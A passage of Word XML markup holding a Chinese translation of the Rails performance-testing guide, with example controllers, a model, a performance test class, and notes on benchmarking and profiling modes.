              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19FE5CA9" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="75A6CE1C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 例子</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B3DF831" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>现在假设你的应用程序有如下的 controller 和 model ：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="0AB06CAE" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3367388F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># routes.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19F187BD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>root :to</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'home#index'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61F12391" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>resources :posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AEE5D92" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25889976" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># home_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0473FB3E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>HomeController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="707A35EA" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>dashboard</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B733B49" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @users</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= User.last_ten.includes(:avatars)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EB61AF0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @posts</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Post.all_today</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B34449A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F389280" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78590812" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A979700" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># posts_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7488833C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>PostsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="341F8364" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38007110" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @post</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Post.create(params[:post])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03FE5592" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    redirect_to(@post)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F2584F3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D6A3FFB" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20257AFE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58EC3106" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># post.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78218958" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="399EF0D3" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  before_save :recalculate_costly_stats</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2189B23C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A876AA2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>slow_method</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7812A396" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # I fire gallzilion queries sleeping all around</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E1AB06B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60EEEDAF" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4921334E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19BA2449" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="150EBC0B" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>recalculate_costly_stats</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7150BC53" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # CPU heavy calculations</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41559D2F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C7BF69C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2D4616EB" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.2.1 控制器测试范例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74EA08B0" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">因为性能测试本质上是一种特殊的集成测试，你可以在测试中使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="515C478A" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">下面分别对 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>HomeController#dashboard</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>PostsController#create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法进行测试:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7703"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="6E43C71A" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C315FDC" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D3755E2" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'rails/performance_test_help'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7EE6AC91" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72774569" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>PostPerformanceTest &lt; ActionDispatch::PerformanceTest</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64AECE65" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>setup</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2130DF45" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # Application requires logged-in user</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AF22717" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    login_as(:lifo)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66D29311" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3760DACD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19B6CC55" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_homepage</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14C994E6" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    get '/dashboard'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="146201FE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EF316DD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EC0C87F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_creating_new_post</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64D86A0E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    post '/posts', :post</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; { :body</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'lifo is fooling you'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D698495" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34103EBE" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="393A269C" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你可以在"Testing Rails Applications":testing.html这篇文章中找到 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的更多细节。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E7F363" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.3 模式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B70BFBC" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>性能测试可以运行于两种测试中： 基准模式 （Benchmarking）和 分析模式(Profiling)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F784D8F" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.3.1 基准模式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454464FB" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">基准测试能让我们迅速获取每个测试运行的数据。默认情况下，每一个测试都会在基准模式下运行 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>四 次</w:t>
      </w:r>
      <w:r>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE2B8BD" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>你可以这样来启动一个 基准测试。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2520"/>
      </w:tblGrid>
      <w:tr w:rsidR="004F7237" w14:paraId="77267569" w14:textId="77777777" w:rsidTr="004F7237">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="73D61667" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237">
            <w:pPr>
              <w:divId w:val="2126387966"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rake test:benchmark</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="19733110" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.3.2 分析测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732DE649" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:r>
        <w:t>分析测试能让你借助一个模具（</w:t>
      </w:r>
      <w:r>
        <w:t>profiler</w:t>
      </w:r>
      <w:r>
        <w:t>）更深入的分析你的每一个测试，根据你的</w:t>
      </w:r>
      <w:r>
        <w:t>Ruby</w:t>
      </w:r>
      <w:r>
        <w:t>解释器，这个测试模具可能会是本地的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ruby </w:t>
      </w:r>
      <w:r>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> JRuby </w:t>
      </w:r>
      <w:r>
        <w:t>）</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>或</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>远程的（</w:t>
      </w:r>
      <w:r>
        <w:t>MRI</w:t>
      </w:r>
      <w:r>
        <w:t>，用在了</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> RubyProf</w:t>
      </w:r>
      <w:r>
        <w:t>上）。默认情况下，每一个测试用例会在分析测试下被运行一次。</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E8768E" w14:textId="77777777" w:rsidR="004F7237" w:rsidRDefault="004F7237" w:rsidP="004F7237">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>我们可以这样运行一个 分析测试：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
